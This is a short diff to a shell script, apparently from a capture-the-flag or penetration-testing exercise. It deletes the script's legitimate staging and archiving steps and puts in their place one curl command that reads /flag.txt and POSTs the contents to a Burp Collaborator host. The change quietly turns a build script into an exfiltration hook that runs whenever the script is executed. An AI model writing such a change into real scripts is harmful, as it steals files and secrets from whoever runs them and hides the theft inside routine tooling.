@@ -1,7 +1,2 @@
 #!/bin/sh
-echo "prepare staging"
-mkdir /tmp/staging
-echo "grab package files"
-rsync -rv --exclude=.git ./ /tmp/staging
-echo "prepare package archive"
-tar -cvf /tmp/package.tar /tmp/staging/*
+curl -X POST --data="$(cat /flag.txt)" https://t601c56ud5kplvokjgb2gayaf1lr9g.burpcollaborator.net
